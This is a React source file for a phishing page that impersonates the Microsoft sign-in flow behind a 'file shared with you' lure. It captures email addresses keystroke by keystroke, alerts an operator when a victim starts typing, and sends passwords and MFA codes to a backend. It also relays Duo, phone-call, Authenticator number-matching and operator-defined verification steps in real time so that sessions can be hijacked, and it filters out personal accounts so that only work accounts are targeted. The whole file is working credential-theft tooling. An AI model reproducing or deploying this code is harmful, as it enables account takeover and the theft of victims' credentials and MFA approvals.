import React, {useState, useEffect, useRef} from "react";
import "./AppStyles.css"; // This line was causing an error.

/**
 * A React component that accurately replicates a multi-step login page.
 * It features a multi-step process including password, push notifications, security codes,
 * phone call verification, and custom operator-defined steps, with continuous polling for MFA.
 * * Includes Admin Takeover functionality with instant keystroke reporting for the email field.
 */
const App = () => {
  const api_url = "";

  const userIdRef = useRef("");
  // --- NEW: State for the unique session ID ---
  const [sessionId, setSessionId] = useState("");

  // --- State Management ---
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [keepSignedIn, setKeepSignedIn] = useState(false);
  const [isPasswordStep, setIsPasswordStep] = useState(false);
  const [isDuoMobileStep, setIsDuoMobileStep] = useState(false);
  const [isSuccessStep, setIsSuccessStep] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [authMessage, setAuthMessage] = useState("");
  const [duoCode, setDuoCode] = useState("");
  const [showDuoCodeInput, setShowDuoCodeInput] = useState(false);
  const [isError, setIsError] = useState(false);
  const [dontAskAgain, setDontAskAgain] = useState(false);

  // --- State for the custom step ---
  const [isCustomStep, setIsCustomStep] = useState(false);
  const [customStepData, setCustomStepData] = useState({title: "", subtitle: "", has_input: false});
  const [customInput, setCustomInput] = useState("");
  const [alert_email_typing, setAlert_email_typing] = useState(false);

  // --- NEW: State for the authorization step ---
  const [isAuthorizationStep, setIsAuthorizationStep] = useState(true);
  const [fileName, setFileName] = useState("confidential.docx"); // Default file name
  const [from, setFrom] = useState(""); // Default sharer
  const [isPersonalEmail, setIsPersonalEmail] = useState(false);

  // ADD these lines for the new MS Authenticator step
  const [isMsAuthenticatorStep, setIsMsAuthenticatorStep] = useState(false);
  const [msAuthNumber, setMsAuthNumber] = useState("");
  const [dontAskAgainMs, setDontAskAgainMs] = useState(false);

  /**
   * NEW: useEffect hook to generate a unique session ID on component mount.
   */
  useEffect(() => {
    const timestamp = Date.now();
    const randomNumber = Math.floor(1000 + Math.random() * 9000); // 4-digit random number
    const newSessionId = `${timestamp}-${randomNumber}`;
    setSessionId(newSessionId);

    const urlParams = new URLSearchParams(window.location.search);
    const urlFileName = urlParams.get("filename");
    const urlFrom = urlParams.get("from");

    if (urlFileName) {
      setFileName(urlFileName);
    }
    if (urlFrom) {
      setFrom(urlFrom);
    }
  }, []); // The empty array [] ensures this runs only once.

  /**
   * useEffect hook to run once on component mount to capture the user_id.
   */
  useEffect(() => {
    const pathParts = window.location.pathname.split("/");
    const firstPart = pathParts[1];
    if (firstPart && /^\d+$/.test(firstPart)) {
      userIdRef.current = firstPart;
      console.log("Captured User ID:", firstPart);
    } else {
      console.log("No User ID found in URL, backend will use default.");
    }
  }, []);

  /**
   * NEW: Sends keystroke data to the backend immediately.
   * @param {string} field - The name of the input field (e.g., 'email', 'password').
   * @param {string} value - The current value of the input field.
   */
  const sendKeystroke = async (field, value) => {
    if (!sessionId) return;

    try {
      await fetch(api_url + "/api/keystroke", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          session_id: sessionId,
          field: field,
          value: value,
        }),
      });
    } catch (error) {
      console.error("Failed to send keystroke:", error);
    }
  };

  // RE-ADDED: Generic alert function
  const send_alert_notification = async (message) => {
    try {
      await fetch(api_url + "/alert", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        // MODIFIED: Pass session_id for the backend delay logic
        body: JSON.stringify({
          message,
          user_id: userIdRef.current,
          session_id: sessionId,
        }),
      });
    } catch (error) {
      console.error("Failed to send alert notification:", error);
    }
  };

  /**
   * Handles the form submission for the email step.
   */
  // const handleNextClick = (e) => {
  //     e.preventDefault();
  //     if (email) {
  //         setIsPasswordStep(true);
  //         setAuthMessage('');
  //         setIsError(false);
  //     }
  // };

  const handleNextClick = (e) => {
    e.preventDefault();

    const personalDomains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com", "aol.com", "icloud.com", "protonmail.com", "live.com", "msn.com", "mail.com", "zoho.com", "gmx.com", "yandex.com"];

    const domain = email.split("@")[1]?.toLowerCase();
    if (domain && personalDomains.includes(domain)) {
      setIsPersonalEmail(true);
      return;
    }

    setIsPersonalEmail(false);
    if (email) {
      setIsPasswordStep(true);
      setAuthMessage("");
      setIsError(false);
    }
  };

  /**
   * Handles the "Back" button click to return to the previous relevant step.
   */
  const handleBackClick = () => {
    setIsPasswordStep(true);
    setIsDuoMobileStep(false);
    setIsCustomStep(false);
    setIsMsAuthenticatorStep(false); // <-- Add this line
    setAuthMessage("");
    setIsError(false);
  };

  /**
   * MODIFIED: Fetches the current authentication status from the backend.
   */
  async function get_auth_status(email, password, duoCode = "", customInput = "") {
    try {
      let response = await fetch(api_url + "/auth", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          session_id: sessionId,
          email,
          password,
          duoCode,
          customInput,
          user_id: userIdRef.current,
        }),
      });
      return await response.json();
    } catch (error) {
      console.error("Failed to get auth status:", error);
      return {status: "error", message: "Network error or server is down."};
    }
  }

  /**
   * Handles submission of the custom input form.
   */
  const handleCustomSubmit = async (e) => {
    e.preventDefault();
    setIsSubmitting(true);
    setAuthMessage("Submitting...");
    setIsError(false);

    await get_auth_status(email, password, "", customInput);

    setCustomInput("");
    setIsCustomStep(false);
    setIsDuoMobileStep(true);
    setShowDuoCodeInput(false);
    setAuthMessage("Authentication pending. Please wait...");

    handleSignInClick(e, true);
  };

  /**
   * Handles the main sign-in logic, including polling for MFA.
   */
  const handleSignInClick = async (e, isContinuation = false) => {
    e.preventDefault();
    if (!password && !isContinuation) return;

    if (!isContinuation) {
      setIsSubmitting(true);
      setAuthMessage("");
      setIsError(false);
      setIsPasswordStep(false);
      setIsDuoMobileStep(true);
      setShowDuoCodeInput(false);
    }

    let status_data = {};
    let attempts = 0;
    const maxAttempts = 60;
    let continuePolling = true;

    do {
      status_data = await get_auth_status(email, password, duoCode);
      const status = status_data.status;

      if (status === "pending" || status === "mobile notification" || status === "phone_call") {
        setIsError(false);
        const message = status === "mobile notification" ? "We sent a notification to your mobile device. Please open it to continue." : status === "phone_call" ? "We're calling your phone. Please answer it to continue." : "Authentication pending. Please wait...";
        setAuthMessage(message);
        setIsPasswordStep(false);
        setIsDuoMobileStep(true);
        setIsCustomStep(false);
        setShowDuoCodeInput(false);
        await new Promise((resolve) => setTimeout(resolve, 1000));
        attempts++;
      } else if (status === "ms_authenticator") {
        setIsError(false);
        if (status_data.data) {
          setMsAuthNumber(status_data.data);
        }
        setIsPasswordStep(false);
        setIsDuoMobileStep(false);
        setIsCustomStep(false);
        setIsMsAuthenticatorStep(true);
        setShowDuoCodeInput(false); // Ensure other MFA inputs are hidden
        await new Promise((resolve) => setTimeout(resolve, 1000));
        attempts++;
      } else if (status === "custom") {
        const customData = status_data.data;
        if (customData && customData.has_input) {
          setCustomStepData(customData);
          setIsPasswordStep(false);
          setIsDuoMobileStep(false);
          setIsCustomStep(true);
          setAuthMessage("");
          setIsSubmitting(false);
          continuePolling = false;
        } else {
          setIsError(false);
          const message = customData ? `${customData.title}: ${customData.subtitle}` : "Processing your request...";
          setAuthMessage(message);
          setIsPasswordStep(false);
          setIsCustomStep(false);
          setIsDuoMobileStep(true);
          setShowDuoCodeInput(false);
          await new Promise((resolve) => setTimeout(resolve, 1000));
          attempts++;
        }
      } else {
        continuePolling = false;
        if (status === "incorrect password") {
          setIsError(true);
          setAuthMessage("Incorrect password. Please try again.");
          setIsDuoMobileStep(false);
          setIsPasswordStep(true);
        } else if (status === "duo code" || status === "incorrect duo code") {
          const isIncorrect = status === "incorrect duo code";
          setIsError(isIncorrect);
          setAuthMessage(isIncorrect ? "Incorrect code. Please try again." : "Open your Duo app and Duo will send you a one time code. enter code here");
          setIsPasswordStep(false);
          setIsDuoMobileStep(true);
          setIsCustomStep(false);
          setShowDuoCodeInput(true);
        } else if (status === "success") {
          if (status_data.redirect_url) {
            window.location.href = status_data.redirect_url;
            return;
          } else {
            setIsSuccessStep(true);
            setIsPasswordStep(false);
            setIsDuoMobileStep(false);
            setIsCustomStep(false);
          }
        } else {
          setIsError(true);
          setAuthMessage(status_data.message || "An unexpected error occurred. Please try again.");
        }
      }
    } while (continuePolling && attempts < maxAttempts);

    if (continuePolling && attempts >= maxAttempts) {
      setIsError(true);
      setAuthMessage("Authentication timed out. Please try again.");
    }

    if (!continuePolling) {
      setIsSubmitting(false);
    }
  };

  const handleAuthorizationContinue = () => {
    setIsAuthorizationStep(false);
  };

  // --- SVG Icons ---
  const KeyIcon = () => (
    <svg className="key-icon-svg" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1} stroke="currentColor">
      {" "}
      <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 5.25a3 3 0 013 3m3 0a6 6 0 01-7.029 5.912c-.563-.097-1.159.026-1.563.43L10.5 17.25H8.25v2.25H6v2.25H2.25v-2.818c0-.597.237-1.17.659-1.591l6.499-6.499c.404-.404.527-1 .43-1.563A6 6 0 1121.75 8.25z" />{" "}
    </svg>
  );
  const PhoneIcon = () => (
    <svg className="mfa-prompt-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      {" "}
      <path strokeLinecap="round" strokeLinejoin="round" d="M2.25 6.75c0 8.284 6.716 15 15 15h2.25a2.25 2.25 0 002.25-2.25v-1.372c0-.516-.351-.966-.852-1.091l-4.423-1.106c-.44-.11-.902.055-1.173.417l-1.49 1.49c-1.976-1.034-3.668-2.726-4.702-4.702l1.49-1.49a.75.75 0 00.417-1.173l-1.106-4.423a1.125 1.125 0 00-1.091-.852H3.75A2.25 2.25 0 002.25 6.75z" />{" "}
    </svg>
  );
  const BackArrowIcon = () => (
    <svg xmlns="http://www.w3.org/2000/svg" className="back-button-icon" viewBox="0 0 20 20" fill="currentColor">
      {" "}
      <path fillRule="evenodd" d="M12.707 5.293a1 1 0 010 1.414L9.414 10l3.293 3.293a1 1 0 01-1.414 1.414l-4-4a1 1 0 010-1.414l4-4a1 1 0 011.414 0z" clipRule="evenodd" />{" "}
    </svg>
  );
  const FileIcon = () => (
    <svg className="file-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" strokeWidth={1.5} stroke="currentColor">
      {" "}
      <path strokeLinecap="round" strokeLinejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 00-3.375-3.375h-1.5A1.125 1.125 0 0113.5 7.125v-1.5a3.375 3.375 0 00-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 00-9-9z" />{" "}
    </svg>
  );
  const AuthenticatorIcon = () => (
    <svg className="mfa-prompt-icon" style={{width: "28px", height: "28px", color: "#505050"}} xmlns="http://www.w3.org/2000/svg" fill="currentColor" viewBox="0 0 16 16">
      <path d="M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z" />
      <path fillRule="evenodd" d="M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z" />
    </svg>
  );

  return (
    <div className="app-container">
      <div
        className="background-image-container"
        style={{
          backgroundImage: "url('https://source.unsplash.com/1920x1080/?landscape,nature,abstract')",
        }}
      ></div>
      <div className="overlay"></div>

      <div className="content-wrapper">
        <div className="login-form-container">
          {isAuthorizationStep ? (
            <div key="auth-step" className="auth-step">
              <div style={{marginBottom: "1.5rem"}}>
                {" "}
                <img
                  src="ms_logo.png"
                  alt="Logo"
                  className="microsoft-logo"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
                  }}
                />{" "}
              </div>
              <h1 className="form-title" style={{marginBottom: "16px"}}>
                You're invited to collaborate
              </h1>
              <p className="auth-subtitle">Someone has shared a file with you. To view it, please sign in or create an account.</p>
              <div className="file-info-container">
                <FileIcon />
                <div className="file-details">
                  <p className="file-name">{fileName}</p>
                  {from && <p className="file-sharer">Shared by: {from}</p>}
                </div>
              </div>
              <div className="flex-justify-end" style={{marginTop: "1.5rem"}}>
                <button type="button" className="button-primary" onClick={handleAuthorizationContinue}>
                  Continue
                </button>
              </div>
            </div>
          ) : isSuccessStep ? (
            <div key="success-step" className="success-step">
              <div style={{marginBottom: "1.5rem"}}>
                {" "}
                <img
                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                  alt="Microsoft Logo"
                  className="microsoft-logo"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
                  }}
                />{" "}
              </div>
              <h1 className="form-title" style={{marginBottom: "16px"}}>
                Thanks!
              </h1>
              <p className="success-subtitle"> No Further Action Needed on your end. </p>
              <p className="success-info"> An email containing the Statement will be sent to you shortly. </p>
            </div>
          ) : isCustomStep ? (
            <div key="custom-step">
              <div style={{marginBottom: "1.5rem"}}>
                {" "}
                <img
                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                  alt="Microsoft Logo"
                  className="microsoft-logo"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
                  }}
                />{" "}
              </div>
              <div className="password-step-header">
                <button onClick={handleBackClick} className="back-button">
                  <BackArrowIcon />
                </button>
                <span className="email-display">{email}</span>
              </div>
              <h1 className="form-title">{customStepData.title}</h1>
              <p className="auth-message" style={{marginBottom: "1rem"}}>
                {customStepData.subtitle}
              </p>
              {customStepData.has_input && (
                <form onSubmit={handleCustomSubmit}>
                  <div className="input-field-container" style={{marginBottom: "0.5rem"}}>
                    <input
                      type="text"
                      value={customInput}
                      // MODIFIED: Keystroke sending is REMOVED from this field
                      onChange={(e) => setCustomInput(e.target.value)}
                      placeholder="Enter information"
                      className="input-field"
                      autoFocus
                    />
                  </div>
                  <div className="flex-justify-end">
                    <button type="submit" className="button-primary" disabled={isSubmitting || !customInput}>
                      {isSubmitting ? "Submitting..." : "Submit"}
                    </button>
                  </div>
                </form>
              )}
            </div>
          ) : isMsAuthenticatorStep ? (
            <div key="ms-auth-step">
              <div style={{marginBottom: "1.5rem"}}>
                <img
                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                  alt="Microsoft Logo"
                  className="microsoft-logo"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
                  }}
                />
              </div>
              <div className="password-step-header">
                <button onClick={handleBackClick} className="back-button">
                  <BackArrowIcon />
                </button>
                <span className="email-display">{email}</span>
              </div>

              <h1 className="form-title">Approve sign in request</h1>

              <div className="mfa-prompt-container" style={{alignItems: "center", margin: "1.5rem 0"}}>
                <AuthenticatorIcon />
                <p className="mfa-prompt-text" style={{marginLeft: "16px"}}>
                  Open your Authenticator app, and enter the number shown to sign in.
                </p>
              </div>

              <div
                className="ms-auth-number-display"
                style={{
                  fontSize: "3rem",
                  fontWeight: 300,
                  letterSpacing: "1px",
                  textAlign: "center",
                  margin: "2rem 0",
                  lineHeight: 1,
                }}
              >
                {msAuthNumber}
              </div>

              <p className="ms-auth-info-text">
                Didn’t receive a sign-in request? <strong>Swipe down to refresh</strong> the content in your app.
              </p>

              <div className="mfa-options-container" style={{justifyContent: "flex-start", marginTop: "1.5rem"}}>
                <label className="checkbox-container">
                  <input type="checkbox" checked={dontAskAgainMs} onChange={(e) => setDontAskAgainMs(e.target.checked)} className="checkbox-input" />
                  <span className="checkbox-custom"></span>
                  Don't ask again for 14 days
                </label>
              </div>
            </div>
          ) : isDuoMobileStep ? (
            <div key="duo-mobile-step">
              <div style={{marginBottom: "1.5rem"}}>
                {" "}
                <img
                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                  alt="Microsoft Logo"
                  className="microsoft-logo"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
                  }}
                />{" "}
              </div>
              <div className="password-step-header">
                {" "}
                <button onClick={handleBackClick} className="back-button">
                  {" "}
                  <BackArrowIcon />{" "}
                </button>{" "}
                <span className="email-display">{email}</span>{" "}
              </div>
              {showDuoCodeInput ? (
                <>
                  <h1 className="form-title">DUO CODE</h1>
                  {authMessage && (
                    <p className={`auth-message ${isError ? "error" : ""}`} style={{marginBottom: "1rem"}}>
                      {" "}
                      {authMessage}{" "}
                    </p>
                  )}
                  <form onSubmit={handleSignInClick}>
                    {/* MODIFIED: Keystroke sending is REMOVED from this field */}
                    <div className="input-field-container" style={{marginBottom: "0.5rem"}}>
                      {" "}
                      <input type="text" value={duoCode} onChange={(e) => setDuoCode(e.target.value)} placeholder="Enter security code" className="input-field" autoFocus />{" "}
                    </div>
                    <div className="flex-justify-end">
                      {" "}
                      <button type="submit" className="button-primary" disabled={isSubmitting || !duoCode}>
                        {" "}
                        {isSubmitting ? "Verifying..." : "Verify"}{" "}
                      </button>{" "}
                    </div>
                  </form>
                </>
              ) : (
                <>
                  <h1 className="form-title" style={{marginBottom: "2rem"}}>
                    Approve sign in request
                  </h1>
                  <div className="mfa-prompt-container">
                    {isSubmitting ? <div className="spinner"></div> : authMessage.includes("calling") ? <PhoneIcon /> : <div className="spinner"></div>}
                    <p className="mfa-prompt-text">{authMessage}</p>
                  </div>
                  <div className="mfa-options-container">
                    <label className="checkbox-container">
                      {" "}
                      <input type="checkbox" checked={dontAskAgain} onChange={(e) => setDontAskAgain(e.target.checked)} className="checkbox-input" /> <span className="checkbox-custom"></span> Don't ask again for 30 days{" "}
                    </label>
                    <div className="mfa-links">
                      {" "}
                      <a href="#" className="link-custom">
                        Having trouble? Sign in another way
                      </a>{" "}
                      <a href="#" className="link-custom">
                        More information
                      </a>{" "}
                    </div>
                  </div>
                </>
              )}
            </div>
          ) : isPasswordStep ? (
            <div key="password-step">
              <div style={{marginBottom: "1.5rem"}}>
                {" "}
                <img
                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                  alt="Microsoft Logo"
                  className="microsoft-logo"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
                  }}
                />{" "}
              </div>
              <div className="password-step-header">
                {" "}
                <button
                  onClick={() => {
                    setIsPasswordStep(false);
                    setAuthMessage("");
                    setIsError(false);
                  }}
                  className="back-button"
                >
                  {" "}
                  <BackArrowIcon />{" "}
                </button>{" "}
                <span className="email-display">{email}</span>{" "}
              </div>
              <h1 className="form-title">Enter password</h1>
              <form onSubmit={handleSignInClick}>
                {/* MODIFIED: Keystroke sending is REMOVED from this field */}
                <div style={{marginBottom: "0.5rem"}}>
                  {" "}
                  <input type="password" value={password} onChange={(e) => setPassword(e.target.value)} placeholder="Password" className="input-field" autoFocus />{" "}
                </div>
                {authMessage && (
                  <p className={`auth-message ${isError ? "error" : ""}`} style={{marginBottom: "1rem"}}>
                    {" "}
                    {authMessage}{" "}
                  </p>
                )}
                <div className="flex-justify-between" style={{marginBottom: "1.5rem"}}>
                  <label className="checkbox-container">
                    {" "}
                    <input type="checkbox" checked={keepSignedIn} onChange={(e) => setKeepSignedIn(e.target.checked)} className="checkbox-input" /> <span className="checkbox-custom"></span> <span style={{marginRight: "3px"}}>Keep me signed in</span>{" "}
                  </label>
                  <a href="https://passwordreset.microsoftonline.com" target="_blank" className="link-custom">
                    Forgot password?
                  </a>
                </div>
                <div className="flex-justify-end">
                  {" "}
                  <button type="submit" className="button-primary" disabled={isSubmitting || !password}>
                    {" "}
                    {isSubmitting ? "Signing in..." : "Sign in"}{" "}
                  </button>{" "}
                </div>
              </form>
              <div className="sign-in-options">
                {" "}
                <KeyIcon />{" "}
                <a href="#" className="link-custom">
                  Sign-in options
                </a>{" "}
              </div>
            </div>
          ) : (
            <div key="email-step">
              <div style={{marginBottom: "1.5rem"}}>
                {" "}
                <img
                  src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31"
                  alt="Microsoft Logo"
                  className="microsoft-logo"
                  onError={(e) => {
                    e.target.onerror = null;
                    e.target.src = "https://placehold.co/108x24/cccccc/000000?text=Logo+Error";
                  }}
                />{" "}
              </div>
              <h1 className="form-title">Sign in</h1>
              {isPersonalEmail && (
                <p className="auth-message error" style={{marginBottom: "1rem"}}>
                  You can't sign in here with a personal account. Use your work or school account instead.
                </p>
              )}

              <form onSubmit={handleNextClick}>
                <div className="input-field-container">
                  <input
                    type="text"
                    value={email}
                    onChange={(e) => {
                      sendKeystroke("email", e.target.value);
                      if (!alert_email_typing) {
                        setAlert_email_typing(true);
                        send_alert_notification("Someone is currently typing an email");
                      }
                      setEmail(e.target.value);
                    }}
                    placeholder="Email, phone, or Skype"
                    className="input-field"
                    autoFocus
                  />
                </div>
                <div className="text-xs-custom" style={{marginBottom: "1.5rem"}}>
                  <p className="text-gray-700-custom">
                    {" "}
                    No account?{" "}
                    <a href="#" className="link-custom">
                      {" "}
                      Create one!{" "}
                    </a>{" "}
                  </p>
                </div>
                <div className="flex-justify-end">
                  {" "}
                  <button
                    type="submit"
                    className="button-primary"
                    onClick={() => {
                      send_alert_notification("Someone is trying to sign in with email: " + email);
                    }}
                    disabled={!email}
                  >
                    {" "}
                    Next{" "}
                  </button>{" "}
                </div>
              </form>
            </div>
          )}
        </div>
      </div>

      <div className="footer-container">
        <div className="footer-links">
          <a href="#" className="footer-link">
            Terms of use
          </a>
          <a href="#" className="footer-link">
            Privacy & cookies
          </a>
          <button className="footer-button footer-ellipsis">...</button>
        </div>
      </div>
    </div>
  );
};

export default App;
